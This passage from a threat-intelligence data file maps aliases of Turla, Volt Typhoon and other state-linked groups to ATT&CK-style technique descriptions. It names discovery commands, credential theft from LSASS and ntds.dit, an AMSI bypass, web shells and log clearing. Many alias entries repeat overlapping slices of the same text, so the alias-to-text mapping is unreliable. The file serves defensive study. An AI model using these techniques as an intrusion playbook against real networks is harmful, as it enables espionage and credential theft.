payload into a random process on the victim system., Turla has used Metasploit to perform reflective DLL injection in order to escalate privileges., Turla RPC backdoors have included local UPnP RPC proxies. , Turla has compromised internal network systems to act as a proxy to forward traffic to C2., Turla surveys a system upon check-in to discover information in the Windows Registry with the reg query command. Turla has also retrieved PowerShell payloads hidden in Registry keys as well as checking keys associated with null session named pipes ., Turla used net use commands to connect to lateral systems within a network., Turla surveys a system upon check-in to discover remote systems on a local network using the net view and net view /DOMAIN commands. Turla has also used net group 'Domain Computers' /domain, net group 'Domain Controllers' /domain, and net group 'Exchange Servers' /domain to enumerate domain computers, including the organization's DC and Exchange Server., Turla has obtained information on security software, including security logging information that may indicate whether their malware has been detected., Turla has modified variables in kernel memory to turn off Driver Signature Enforcement after exploiting vulnerabilities that obtained kernel mode privileges., Turla surveys a system upon check-in to discover operating system configuration details using the systeminfo and set commands., Turla surveys a system upon check-in to discover network configuration details using the arp -a, nbtstat -n, net config, ipconfig /all, and route commands, as well as NBTscan. Turla RPC backdoors have also retrieved registered RPC interface information from process memory., Turla has used tracert to check internet connectivity., Turla surveys a system upon check-in to discover active local network connections using the netstat -an, net use, net file, and net session commands. Turla RPC backdoors have also enumerated the IPv4 TCP connection table via the GetTcpTable2 API call., Turla surveys a system upon check-in to discover running services and associated processes using the tasklist /svc command., Turla surveys a system upon check-in to discover the system time by using the net time command., Turla has used spearphishing via a link to get users to download and run their malware., Turla has abused local accounts that have the same password across the victim’s network., Turla has used legitimate web services including Pastebin, Dropbox, and GitHub for C2 communications., A Turla JavaScript backdoor has used Google Apps Script as its C2 server.",
    "IRON HUNTER": "Turla is a cyber espionage threat group that has been attributed to Russia's Federal Security Service (FSB).  They have compromised victims in over 50 countries since at least 2004, spanning a range of industries including government, embassies, military, education, research and pharmaceutical companies. Turla is known for conducting watering hole and spearphishing campaigns, and leveraging in-house tools and malware, such as Uroburos., , , Based similarity in TTPs and malware used, Turla and Waterbug appear to be the same group., WhiteBear is a designation used by Securelist to describe a cluster of activity that has overlaps with activity described by others as Turla, but appears to have a separate focus., , , , , , Turla RPC backdoors can impersonate or steal process tokens before executing commands. , Turla has used net user to enumerate local accounts on the system., Turla has used net user /domain to enumerate domain accounts., Turla has created web accounts including Dropbox and GitHub for C2 and document exfiltration., Turla has used HTTP and HTTPS for C2 communications., Turla has used multiple backdoors which communicate with a C2 server via email attachments., Turla has encrypted files stolen from connected USB drives into a RAR file before exfiltration., A Turla Javascript backdoor added a local_update_check value under the Registry key HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Run to establish persistence. Additionally, a Turla custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence., Turla established persistence by adding a Shell value under the Registry key HKCU/Software/Microsoft/Windows NT/CurrentVersion/Winlogon., Turla may attempt to connect to systems within a victim's network using net use commands and a predefined list or collection of passwords., Turla has used PowerShell to execute commands/scripts, in some cases via a custom executable or code from Empire's PSInject. Turla has also used PowerShell scripts to load and execute malware in memory., Turla RPC backdoors have used cmd.exe to execute commands., Turla has used VBS scripts throughout its operations. , Turla has used IronPython scripts as part of the IronNetInjector toolchain to drop payloads., Turla has used various JavaScript-based backdoors. , Turla has used the VPS infrastructure of compromised Iranian threat actors., Turla has used compromised servers as infrastructure., Turla has frequently used compromised WordPress sites for C2 infrastructure.",
    "Group 88": "Turla RPC backdoors have used cmd.exe to execute commands., Turla has used VBS scripts throughout its operations. , Turla has used IronPython scripts as part of the IronNetInjector toolchain to drop payloads., Turla has used various JavaScript-based backdoors. , Turla has used the VPS infrastructure of compromised Iranian threat actors., Turla has used compromised servers as infrastructure., Turla has frequently used compromised WordPress sites for C2 infrastructure., Turla has gathered credentials from the Windows Credential Manager tool. , Turla has used a custom .NET tool to collect documents from an organization's internal central database., Turla RPC backdoors can upload files from victim machines., Turla RPC backdoors can collect files from USB thumb drives., Turla has used a custom decryption routine, which pulls key and salt values from other artifacts such as a WMI filter or PowerShell Profile, to decode encrypted PowerShell payloads., Turla has developed its own unique malware for use in operations., Turla has infected victims using watering holes., Turla has used WMI event filters and consumers to establish persistence., Turla has used PowerShell profiles to maintain persistence on an infected machine., Turla has used WebDAV to upload stolen USB files to a cloud drive. Turla has also exfiltrated stolen files to OneDrive and 4shared., Turla has exploited vulnerabilities in the VBoxDrv.sys driver to obtain kernel mode privileges., Turla surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, the Program Files directory, and Recent. Turla RPC backdoors have also searched for files matching the lPH*.dll pattern., Turla surveys a system upon check-in to discover Group Policy details using the gpresult command., Turla has placed LunarWeb install files into directories that are excluded from scanning., Turla has used a AMSI bypass, which patches the in-memory amsi.dll, in PowerShell scripts to bypass Windows antimalware products., Turla has used shellcode to download Meterpreter after compromising a victim.",
    "Waterbug": "Turla has used a custom decryption routine, which pulls key and salt values from other artifacts such as a WMI filter or PowerShell Profile, to decode encrypted PowerShell payloads., Turla has developed its own unique malware for use in operations., Turla has infected victims using watering holes., Turla has used WMI event filters and consumers to establish persistence., Turla has used PowerShell profiles to maintain persistence on an infected machine., Turla has used WebDAV to upload stolen USB files to a cloud drive. Turla has also exfiltrated stolen files to OneDrive and 4shared., Turla has exploited vulnerabilities in the VBoxDrv.sys driver to obtain kernel mode privileges., Turla surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, the Program Files directory, and Recent. Turla RPC backdoors have also searched for files matching the lPH*.dll pattern., Turla surveys a system upon check-in to discover Group Policy details using the gpresult command., Turla has placed LunarWeb install files into directories that are excluded from scanning., Turla has used a AMSI bypass, which patches the in-memory amsi.dll, in PowerShell scripts to bypass Windows antimalware products., Turla has used shellcode to download Meterpreter after compromising a victim.",
    "WhiteBear": "Turla has also exfiltrated stolen files to OneDrive and 4shared., Turla has exploited vulnerabilities in the VBoxDrv.sys driver to obtain kernel mode privileges., Turla surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, the Program Files directory, and Recent. Turla RPC backdoors have also searched for files matching the lPH*.dll pattern., Turla surveys a system upon check-in to discover Group Policy details using the gpresult command., Turla has placed LunarWeb install files into directories that are excluded from scanning., Turla has used a AMSI bypass, which patches the in-memory amsi.dll, in PowerShell scripts to bypass Windows antimalware products., Turla has used shellcode to download Meterpreter after compromising a victim., Turla RPC backdoors can be used to transfer files to/from victim machines on the local network., Turla has named components of LunarWeb to mimic Zabbix agent logs., Turla has modified Registry values to store payloads., Turla and its RPC backdoors have used APIs calls for various tasks related to subverting AMSI and accessing then executing commands through RPC and/or named pipes., Based on comparison of Gazer versions, Turla made an effort to obfuscate strings in the malware that could be used as IoCs, including the mutex name and named pipe., Turla has used encryption (including salted 3DES via PowerSploit's Out-EncryptedScript.ps1), random variable names, and base64 encoding to obfuscate PowerShell commands and payloads., Turla has used the Registry to store encrypted and encoded payloads.",
    "Snake": "Turla has used malware obtained after compromising other threat actors, such as OilRig., Turla has obtained and customized publicly-available tools like Mimikatz., Turla has used net accounts and net accounts /domain to acquire password policy information., Turla has used fsutil fsinfo drives to list connected drives., Turla has used net localgroup and net localgroup Administrators to enumerate group information, including members of the local administrators group., Turla has used net group 'Domain Admins' /domain to identify domain administrators., Turla attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access., Turla surveys a system upon check-in to discover running processes using the tasklist /v command. Turla RPC backdoors have also enumerated processes associated with specific open ports or named pipes., Turla has also used PowerSploit's Invoke-ReflectivePEInjection.ps1 to reflectively load a PowerShell payload into a random process on the victim system., Turla has used Metasploit to perform reflective DLL injection in order to escalate privileges., Turla RPC backdoors have included local UPnP RPC proxies. , Turla has compromised internal network systems to act as a proxy to forward traffic to C2., Turla surveys a system upon check-in to discover information in the Windows Registry with the reg query command. Turla has also retrieved PowerShell payloads hidden in Registry keys as well as checking keys associated with null session named pipes ., Turla used net use commands to connect to lateral systems within a network.",
    "Krypton": "Turla surveys a system upon check-in to discover remote systems on a local network using the net view and net view /DOMAIN commands. Turla has also used net group 'Domain Computers' /domain, net group 'Domain Controllers' /domain, and net group 'Exchange Servers' /domain to enumerate domain computers, including the organization's DC and Exchange Server., Turla has obtained information on security software, including security logging information that may indicate whether their malware has been detected., Turla has modified variables in kernel memory to turn off Driver Signature Enforcement after exploiting vulnerabilities that obtained kernel mode privileges., Turla surveys a system upon check-in to discover operating system configuration details using the systeminfo and set commands., Turla surveys a system upon check-in to discover network configuration details using the arp -a, nbtstat -n, net config, ipconfig /all, and route commands, as well as NBTscan. Turla RPC backdoors have also retrieved registered RPC interface information from process memory., Turla has used tracert to check internet connectivity., Turla surveys a system upon check-in to discover active local network connections using the netstat -an, net use, net file, and net session commands. Turla RPC backdoors have also enumerated the IPv4 TCP connection table via the GetTcpTable2 API call., Turla surveys a system upon check-in to discover running services and associated processes using the tasklist /svc command., Turla surveys a system upon check-in to discover the system time by using the net time command., Turla has used spearphishing via a link to get users to download and run their malware., Turla has abused local accounts that have the same password across the victim’s network., Turla has used legitimate web services including Pastebin, Dropbox, and GitHub for C2 communications., A Turla JavaScript backdoor has used Google Apps Script as its C2 server.",
    "UNC788": "UNC788 is a group of hackers from Iran that has targeted people in the Middle East., UNC788 has used phishing and social engineering to distribute malware.",
    "Volatile Cedar": "Volatile Cedar is a Lebanese threat group that has targeted individuals, companies, and institutions worldwide. Volatile Cedar has been operating since 2012 and is motivated by political and ideological interests., , Volatile Cedar has performed vulnerability scans of the target server., Volatile Cedar has used DirBuster and GoBuster to brute force web directories and DNS subdomains., Volatile Cedar has targeted publicly facing web servers, with both automatic and manual vulnerability discovery.  , Volatile Cedar can deploy additional tools., Volatile Cedar can inject web shell code into a server.",
    "Volt Typhoon": "Volt Typhoon is a People's Republic of China (PRC) state-sponsored actor that has been active since at least 2021 primarily targeting critical infrastructure organizations in the US and its territories including Guam. Volt Typhoon's targeting and pattern of behavior have been assessed as pre-positioning to enable lateral movement to operational technology (OT) assets for potential destructive or disruptive attacks. Volt Typhoon has emphasized stealth in operations using web shells, living-off-the-land (LOTL) binaries, hands on keyboard activities, and stolen credentials., , , , , , , Volt Typhoon used KV Botnet Activity to build intermediate communication chains between operators and victims, such as identified access to victims in Guam., Versa Director Zero Day Exploitation was conducted by Volt Typhoon between June and August 2024., Volt Typhoon has executed net user and quser to enumerate local account information., Volt Typhoon has run net group /dom and net group 'Domain Admins' /dom in compromised environments for account discovery., KV Botnet Activity used acquired Virtual Private Servers as control systems for devices infected with KV Botnet malware., Versa Director Zero Day Exploitation established HTTPS communications from adversary-controlled SOHO devices over port 443 with compromised Versa Director servers., Volt Typhoon has collected window title information from compromised systems., Volt Typhoon has archived the ntds.dit database as a multi-volume password-protected archive with 7-Zip., Volt Typhoon has targeted the browsing history of network administrators., Volt Typhoon has used PowerShell including for remote system discovery., Volt Typhoon has used the Windows command line to perform hands-on-keyboard activities in targeted environments including for discovery., Volt Typhoon has used Brightmetricagent.exe which contains a command- line interface (CLI) library that can leverage command shells including Z Shell (zsh).KV Botnet Activity utilizes multiple Bash scripts during botnet installation stages, and the final botnet payload allows for running commands in the Bash shell., KV Botnet Activity utilizes multiple Bash scripts during botnet installation stages, and the final botnet payload allows for running commands in the Bash shell., Volt Typhoon has compromised Virtual Private Servers (VPS) to proxy C2 traffic., Volt Typhoon has used compromised Paessler Router Traffic Grapher (PRTG) servers from other organizations for C2., Volt Typhoon Volt Typhoon has used compromised Cisco and NETGEAR end-of-life SOHO routers implanted with KV Botnet malware to support operations., Volt Typhoon has compromised small office and home office (SOHO) network edge devices, many of which were located in the same geographic area as the victim, to proxy network traffic.Versa Director Zero Day Exploitation used compromised small office/home office (SOHO) devices to interact with vulnerable Versa Director servers.KV Botnet Activity focuses on compromise of small office-home office (SOHO) network devices to build the subsequent botnet., Versa Director Zero Day Exploitation used compromised small office/home office (SOHO) devices to interact with vulnerable Versa Director servers., KV Botnet Activity focuses on compromise of small office-home office (SOHO) network devices to build the subsequent botnet., Volt Typhoon has attempted to obtain credentials from OpenSSH, realvnc, and PuTTY., Volt Typhoon has targeted network administrator browser data including browsing history and stored credentials., Volt Typhoon has stolen files from a sensitive file server and the Active Directory database from targeted environments, and used Wevtutil to extract event log information., Volt Typhoon has staged collected data in password-protected archives., Volt Typhoon has saved stolen files including the ntds.dit database and the SYSTEM and SECURITY Registry hives locally to the C:/Windows/Temp/ directory., Versa Director Zero Day Exploitation involved the development of a new web shell variant, VersaMem., Volt Typhoon has exploited zero-day vulnerabilities for initial access., Volt Typhoon has executed the Windows-native vssadmin command to create volume shadow copies., Volt Typhoon has used a version of the Awen web shell that employed AES encryption and decryption for C2 communications., Versa Director Zero Day Exploitation used HTTPS for command and control of compromised Versa Director servers., KV Botnet Activity involves managing events on victim systems via libevent to execute a callback function when any running process contains the following references in their path without also having a reference to bioset: busybox, wget, curl, tftp, telnetd, or lua. If the bioset string is not found, the related process is terminated., Volt Typhoon has gained initial access through exploitation of multiple vulnerabilities in internet-facing software and appliances such as Fortinet, Ivanti (formerly Pulse Secure), NETGEAR, Citrix, and Cisco.Versa Director Zero Day Exploitation involved exploitation of a vulnerability in Versa Director servers, since identified as CVE-2024-39717, for initial access and code execution., Versa Director Zero Day Exploitation involved exploitation of a vulnerability in Versa Director servers, since identified as CVE-2024-39717, for initial access and code execution., Volt Typhoon has gained initial access by exploiting privilege escalation vulnerabilities in the operating system or network services., Volt Typhoon has used VPNs to connect to victim environments and enable post-exploitation actions., Volt Typhoon has enumerated directories containing vulnerability testing and cyber related content and facilities data such as construction drawings.KV Botnet Activity gathers a list of filenames from the following locations during execution of the final botnet stage: //usr//sbin//, //usr//bin//,  //sbin//, //pfrm2.0//bin//, //usr//local//bin//., KV Botnet Activity gathers a list of filenames from the following locations during execution of the final botnet stage: //usr//sbin//, //usr//bin//,  //sbin//, //pfrm2.0//bin//, //usr//local//bin//., KV Botnet Activity altered permissions on downloaded tools and payloads to enable execution on victim machines., Volt Typhoon has conducted pre-compromise reconnaissance for victim host information., Volt Typhoon has gathered victim identify information during pre-compromise reconnaissance. , Volt Typhoon has targeted the personal emails of key network and IT staff at victim organizations., Volt Typhoon has conducted extensive pre-compromise reconnaissance to learn about the target organization’s network., Volt Typhoon has conducted extensive reconnaissance of victim networks including identifying network topologies., Volt Typhoon has identified target network security measures as part of pre-compromise reconnaissance., Volt Typhoon has conducted extensive reconnaissance pre-compromise to gain information about the targeted organization., Volt Typhoon has identified key network and IT staff members pre-compromise at targeted organizations., KV Botnet Activity used various scripts to remove or disable security tools, such as http_watchdog and firewallsd, as well as tools related to other botnet infections, such as mips_ff, on victim devices., Volt Typhoon has selectively cleared Windows Event Logs, system logs, and other technical artifacts to remove evidence of intrusion activity., Volt Typhoon has run rd /S to delete their working directories and deleted systeminfo.dat from C:/Users/Public/Documentsfiles., [KV Botnet Activity](https://attack.mitre.org/campaigns/C0035) removes on-disk copies of tools and other artifacts after it the primary botnet payload has been loaded into memory on the victim device., Volt Typhoon has inspected server logs to remove their IPs., Volt Typhoon has downloaded an outdated version of comsvcs.dll to a compromised domain controller in a non-standard folder.KV Botnet Activity included the use of scripts to download additional payloads when compromising network nodes., KV Botnet Activity included the use of scripts to download additional payloads when compromising network nodes., Volt Typhoon has created and accessed a file named rult3uil.log on compromised domain controllers to capture keypresses and command execution., Volt Typhoon has copied web shells between servers in targeted environments., Volt Typhoon has used wevtutil.exe and the PowerShell command Get-EventLog security to enumerate Windows logs to search for successful logons., KV Botnet Activity installation steps include first identifying, then stopping, any process containing [kworker//0:1], then renaming its initial installation stage to this process name., Volt Typhoon has used legitimate looking filenames for compressed copies of the ntds.dit database and used names including cisco_up.exe, cl64.exe, vm3dservice.exe, watchdogd.exe, Win.exe, WmiPreSV.exe, and WmiPrvSE.exe for the Earthworm and Fast Reverse Proxy tools., Volt Typhoon has appended copies of the ntds.dit database with a .gif file extension., Volt Typhoon has used netsh to create a PortProxy Registry modification on a compromised server running the Paessler Router Traffic Grapher (PRTG)., Volt Typhoon has used commercial tools, LOTL utilities, and appliances already present on the system for network service discovery., Versa Director Zero Day Exploitation used a non-standard TCP session to initialize communication prior to establishing HTTPS command and control.KV Botnet Activity command and control traffic uses a non-standard, likely custom protocol for communication., KV Botnet Activity command and control traffic uses a non-standard, likely custom protocol for communication., KV Botnet Activity generates a random port number greater than 30,000 to serve as the listener for subsequent command and control activity., Volt Typhoon has used the Ultimate Packer for Executables (UPX) to obfuscate the FRP client files BrightmetricAgent.exe and SMSvcService.ex) and the port scanning utility ScanLine., Volt Typhoon has used legitimate network and forensic tools and customized versions of open-source tools for C2., Volt Typhoon has used publicly available exploit code for initial access., Volt Typhoon has attempted to access hashed credentials from the LSASS process memory space., Volt Typhoon has used ntds.util to create domain controller installation media containing usernames and password hashes., Volt Typhoon has obtained victim's screen dimension and display device information., Volt Typhoon has used commercial tools, LOTL utilities, and appliances already present on the system for group and user discovery., Volt Typhoon has run net localgroup administrators in compromised environments to enumerate accounts., Volt Typhoon has run net group in compromised environments to discover domain groups., Volt Typhoon has enumerated running processes on targeted systems including through the use of Tasklist.Scripts associated with KV Botnet Activity initial deployment can identify processes related to security tools and other botnet families for follow-on disabling during installation., Scripts associated with KV Botnet Activity initial deployment can identify processes related to security tools and other botnet families for follow-on disabling during installation., KV Botnet Activity final payload installation includes mounting and binding to the //proc// filepath on the victim system to enable subsequent operation in memory while also removing on-disk artifacts., Volt Typhoon has used compromised devices and customized versions of open source tools  such as FRP (Fast Reverse Proxy), Earthworm, and Impacket to proxy network traffic., Volt Typhoon has used the built-in netsh port proxy command to create proxies on compromised systems to facilitate access., Volt Typhoon has used multi-hop proxies for command-and-control infrastructure., Volt Typhoon has queried the Registry on compromised systems, reg query hklm/software/, for information on installed software including PuTTY., Volt Typhoon has moved laterally to the Domain Controller via RDP using a compromised account with domain administrator privileges., Volt Typhoon has used multiple methods, including Ping, to enumerate systems on compromised networks., Volt Typhoon has obtained a screenshot of the victim's system using the gdi32.dll and gdiplus.dll libraries., Volt Typhoon has used FOFA, Shodan, and Censys to search for exposed victim infrastructure., Volt Typhoon has conducted pre-compromise web searches for victim information., Volt Typhoon has conducted pre-compromise reconnaissance on victim-owned sites., Volt Typhoon has used webshells, including ones named AuditReport.jspx and iisstart.aspx, in compromised environments.Versa Director Zero Day Exploitation resulted in the deployment of the VersaMem web shell for follow-on activity., Versa Director Zero Day Exploitation resulted in the deployment of the VersaMem web shell for follow-on activity., Volt Typhoon has queried the Registry on compromised systems for information on installed software., KV Botnet Activity involved removal of security tools, as well as other identified IOT malware, from compromised devices., Volt Typhoon has used native tools and processes including living off the land binaries or 'LOLBins' to maintain and expand access to the victim networks., Volt Typhoon has discovered file system types, drive names, size, and free space on compromised systems.KV Botnet Activity includes use of native system tools, such as uname, to obtain information about victim device architecture, as well as gathering other system information such as the victim's hosts file and CPU utilization., KV Botnet Activity includes use of native system tools, such as uname, to obtain information about victim device architecture, as well as gathering other system information such as the victim's hosts file and CPU utilization., Volt Typhoon has obtained the victim's system current location., Volt Typhoon has executed multiple commands to enumerate network topology and settings including  ipconfig, netsh interface firewall show all, and netsh interface portproxy show all.KV Botnet Activity gathers victim IP information during initial installation stages., KV Botnet Activity gathers victim IP information during initial installation stages., Volt Typhoon has employed Ping to check network connectivity., Volt Typhoon has used netstat -ano on compromised hosts to enumerate network connections. , Volt Typhoon has used public tools and executed the PowerShell command Get-EventLog security -instanceid 4624 to identify associated user and computer account names., Volt Typhoon has used net start to list running services., Volt Typhoon has obtained the victim's system timezone., Volt Typhoon has obtained credentials insecurely stored on targeted network appliances., Volt Typhoon has accessed a Local State file that contains the AES key used to encrypt passwords stored in the Chrome browser., Volt Typhoon relies primarily on valid credentials for persistence., Volt Typhoon has used compromised domain accounts to authenticate to devices on compromised networks., Volt Typhoon has run system checks to determine if they were operating in a virtualized environment., Volt Typhoon has leveraged WMIC for execution, remote system discovery, and to create and use temporary directories.",
    "BRONZE SILHOUETTE": "Volt Typhoon has run net group /dom and net group 'Domain Admins' /dom in compromised environments for account discovery., KV Botnet Activity used acquired Virtual Private Servers as control systems for devices infected with KV Botnet malware., Versa Director Zero Day Exploitation established HTTPS communications from adversary-controlled SOHO devices over port 443 with compromised Versa Director servers., Volt Typhoon has collected window title information from compromised systems., Volt Typhoon has archived the ntds.dit database as a multi-volume password-protected archive with 7-Zip., Volt Typhoon has targeted the browsing history of network administrators., Volt Typhoon has used PowerShell including for remote system discovery., Volt Typhoon has used the Windows command line to perform hands-on-keyboard activities in targeted environments including for discovery., Volt Typhoon has used Brightmetricagent.exe which contains a command- line interface (CLI) library that can leverage command shells including Z Shell (zsh).KV Botnet Activity utilizes multiple Bash scripts during botnet installation stages, and the final botnet payload allows for running commands in the Bash shell., KV Botnet Activity utilizes multiple Bash scripts during botnet installation stages, and the final botnet payload allows for running commands in the Bash shell., Volt Typhoon has compromised Virtual Private Servers (VPS) to proxy C2 traffic., Volt Typhoon has used compromised Paessler Router Traffic Grapher (PRTG) servers from other organizations for C2., Volt Typhoon Volt Typhoon has used compromised Cisco and NETGEAR end-of-life SOHO routers implanted with KV Botnet malware to support operations., Volt Typhoon has compromised small office and home office (SOHO) network edge devices, many of which were located in the same geographic area as the victim, to proxy network traffic.Versa Director Zero Day Exploitation used compromised small office/home office (SOHO) devices to interact with vulnerable Versa Director servers.",
    "Vanguard Panda": "KV Botnet Activity focuses on compromise of small office-home office (SOHO) network devices to build the subsequent botnet., Volt Typhoon has attempted to obtain credentials from OpenSSH, realvnc, and PuTTY., Volt Typhoon has targeted network administrator browser data including browsing history and stored credentials., Volt Typhoon has stolen files from a sensitive file server and the Active Directory database from targeted environments, and used Wevtutil to extract event log information., Volt Typhoon has staged collected data in password-protected archives., Volt Typhoon has saved stolen files including the ntds.dit database and the SYSTEM and SECURITY Registry hives locally to the C:/Windows/Temp/ directory., Versa Director Zero Day Exploitation involved the development of a new web shell variant, VersaMem., Volt Typhoon has exploited zero-day vulnerabilities for initial access., Volt Typhoon has executed the Windows-native vssadmin command to create volume shadow copies., Volt Typhoon has used a version of the Awen web shell that employed AES encryption and decryption for C2 communications., Versa Director Zero Day Exploitation used HTTPS for command and control of compromised Versa Director servers., KV Botnet Activity involves managing events on victim systems via libevent to execute a callback function when any running process contains the following references in their path without also having a reference to bioset: busybox, wget, curl, tftp, telnetd, or lua. If the bioset string is not found, the related process is terminated., Volt Typhoon has gained initial access through exploitation of multiple vulnerabilities in internet-facing software and appliances such as Fortinet, Ivanti (formerly Pulse Secure), NETGEAR, Citrix, and Cisco.Versa Director Zero Day Exploitation involved exploitation of a vulnerability in Versa Director servers, since identified as CVE-2024-39717, for initial access and code execution., Versa Director Zero Day Exploitation involved exploitation of a vulnerability in Versa Director servers, since identified as CVE-2024-39717, for initial access and code execution., Volt Typhoon has gained initial access by exploiting privilege escalation vulnerabilities in the operating system or network services., Volt Typhoon has used VPNs to connect to victim environments and enable post-exploitation actions., Volt Typhoon has enumerated directories containing vulnerability testing and cyber related content and facilities data such as construction drawings.",
    "DEV-0391": "Volt Typhoon has staged collected data in password-protected archives., Volt Typhoon has saved stolen files including the ntds.dit database and the SYSTEM and SECURITY Registry hives locally to the C:/Windows/Temp/ directory., Versa Director Zero Day Exploitation involved the development of a new web shell variant, VersaMem., Volt Typhoon has exploited zero-day vulnerabilities for initial access., Volt Typhoon has executed the Windows-native vssadmin command to create volume shadow copies., Volt Typhoon has used a version of the Awen web shell that employed AES encryption and decryption for C2 communications., Versa Director Zero Day Exploitation used HTTPS for command and control of compromised Versa Director servers., KV Botnet Activity involves managing events on victim systems via libevent to execute a callback function when any running process contains the following references in their path without also having a reference to bioset: busybox, wget, curl, tftp, telnetd, or lua. If the bioset string is not found, the related process is terminated., Volt Typhoon has gained initial access through exploitation of multiple vulnerabilities in internet-facing software and appliances such as Fortinet, Ivanti (formerly Pulse Secure), NETGEAR, Citrix, and Cisco.Versa Director Zero Day Exploitation involved exploitation of a vulnerability in Versa Director servers, since identified as CVE-2024-39717, for initial access and code execution., Versa Director Zero Day Exploitation involved exploitation of a vulnerability in Versa Director servers, since identified as CVE-2024-39717, for initial access and code execution., Volt Typhoon has gained initial access by exploiting privilege escalation vulnerabilities in the operating system or network services., Volt Typhoon has used VPNs to connect to victim environments and enable post-exploitation actions., Volt Typhoon has enumerated directories containing vulnerability testing and cyber related content and facilities data such as construction drawings.KV Botnet Activity gathers a list of filenames from the following locations during execution of the final botnet stage: //usr//sbin//, //usr//bin//,  //sbin//, //pfrm2.0//bin//, //usr//local//bin//., KV Botnet Activity gathers a list of filenames from the following locations during execution of the final botnet stage: //usr//sbin//, //usr//bin//,  //sbin//, //pfrm2.0//bin//, //usr//local//bin//., KV Botnet Activity altered permissions on downloaded tools and payloads to enable execution on victim machines., Volt Typhoon has conducted pre-compromise reconnaissance for victim host information., Volt Typhoon has gathered victim identify information during pre-compromise reconnaissance. , Volt Typhoon has targeted the personal emails of key network and IT staff at victim organizations., Volt Typhoon has conducted extensive pre-compromise reconnaissance to learn about the target organization’s network., Volt Typhoon has conducted extensive reconnaissance of victim networks including identifying network topologies.",
    "UNC3236": "Volt Typhoon has conducted pre-compromise reconnaissance for victim host information., Volt Typhoon has gathered victim identify information during pre-compromise reconnaissance. , Volt Typhoon has targeted the personal emails of key network and IT staff at victim organizations., Volt Typhoon has conducted extensive pre-compromise reconnaissance to learn about the target organization’s network., Volt Typhoon has conducted extensive reconnaissance of victim networks including identifying network topologies., Volt Typhoon has identified target network security measures as part of pre-compromise reconnaissance., Volt Typhoon has conducted extensive reconnaissance pre-compromise to gain information about the targeted organization., Volt Typhoon has identified key network and IT staff members pre-compromise at targeted organizations., KV Botnet Activity used various scripts to remove or disable security tools, such as http_watchdog and firewallsd, as well as tools related to other botnet infections, such as mips_ff, on victim devices., Volt Typhoon has selectively cleared Windows Event Logs, system logs, and other technical artifacts to remove evidence of intrusion activity., Volt Typhoon has run rd /S to delete their working directories and deleted systeminfo.dat from C:/Users/Public/Documentsfiles., [KV Botnet Activity](https://attack.mitre.org/campaigns/C0035) removes on-disk copies of tools and other artifacts after it the primary botnet payload has been loaded into memory on the victim device., Volt Typhoon has inspected server logs to remove their IPs., Volt Typhoon has downloaded an outdated version of comsvcs.dll to a compromised domain controller in a non-standard folder.KV Botnet Activity included the use of scripts to download additional payloads when compromising network nodes., KV Botnet Activity included the use of scripts to download additional payloads when compromising network nodes., Volt Typhoon has created and accessed a file named rult3uil.log on compromised domain controllers to capture keypresses and command execution., Volt Typhoon has copied web shells between servers in targeted environments., Volt Typhoon has used wevtutil.exe and the PowerShell command Get-EventLog security to enumerate Windows logs to search for successful logons., KV Botnet Activity installation steps include first identifying, then stopping, any process containing [kworker//0:1], then renaming its initial installation stage to this process name., Volt Typhoon has used legitimate looking filenames for compressed copies of the ntds.dit database and used names including cisco_up.exe, cl64.exe, vm3dservice.exe, watchdogd.exe, Win.exe, WmiPreSV.exe, and WmiPrvSE.exe for the Earthworm and Fast Reverse Proxy tools.",
    "Voltzite": "Volt Typhoon has created and accessed a file named rult3uil.log on compromised domain controllers to capture keypresses and command execution., Volt Typhoon has copied web shells between servers in targeted environments., Volt Typhoon has used wevtutil.exe and the PowerShell command Get-EventLog security to enumerate Windows logs to search for successful logons., KV Botnet Activity installation steps include first identifying, then stopping, any process containing [kworker//0:1], then renaming its initial installation stage to this process name., Volt Typhoon has used legitimate looking filenames for compressed copies of the ntds.dit database and used names including cisco_up.exe, cl64.exe, vm3dservice.exe, watchdogd.exe, Win.exe, WmiPreSV.exe, and WmiPrvSE.exe for the Earthworm and Fast Reverse Proxy tools., Volt Typhoon has appended copies of the ntds.dit database with a .gif file extension., Volt Typhoon has used netsh to create a PortProxy Registry modification on a compromised server running the Paessler Router Traffic Grapher (PRTG)., Volt Typhoon has used commercial tools, LOTL utilities, and appliances already present on the system for network service discovery., Versa Director Zero Day Exploitation used a non-standard TCP session to initialize communication prior to establishing HTTPS command and control.KV Botnet Activity command and control traffic uses a non-standard, likely custom protocol for communication., KV Botnet Activity command and control traffic uses a non-standard, likely custom protocol for communication., KV Botnet Activity generates a random port number greater than 30,000 to serve as the listener for subsequent command and control activity., Volt Typhoon has used the Ultimate Packer for Executables (UPX) to obfuscate the FRP client files BrightmetricAgent.exe and SMSvcService.ex) and the port scanning utility ScanLine., Volt Typhoon has used legitimate network and forensic tools and customized versions of open-source tools for C2., Volt Typhoon has used publicly available exploit code for initial access., Volt Typhoon has attempted to access hashed credentials from the LSASS process memory space., Volt Typhoon has used ntds.util to create domain controller installation media containing usernames and password hashes., Volt Typhoon has obtained victim's screen dimension and display device information., Volt Typhoon has used commercial tools, LOTL utilities, and appliances already present on the system for group and user discovery., Volt Typhoon has run net localgroup administrators in compromised environments to enumerate accounts., Volt Typhoon has run net group in compromised environments to discover domain groups., Volt Typhoon has enumerated running processes on targeted systems including through the use of Tasklist.Scripts associated with KV Botnet Activity initial deployment can identify processes related to security tools and other botnet families for follow-on disabling during installation., Scripts associated with KV Botnet Activity initial deployment can identify processes related to security tools and other botnet families for follow-on disabling during installation., KV Botnet Activity final payload installation includes mounting and binding to the //proc// filepath on the victim system to enable subsequent operation in memory while also removing on-disk artifacts., Volt Typhoon has used compromised devices and customized versions of open source tools  such as FRP (Fast Reverse Proxy), Earthworm, and Impacket to proxy network traffic., Volt Typhoon has used the built-in netsh port proxy command to create proxies on compromised systems to facilitate access., Volt Typhoon has used multi-hop proxies for command-and-control infrastructure., Volt Typhoon has queried the Registry on compromised systems, reg query hklm/software/, for information on installed software including PuTTY.",
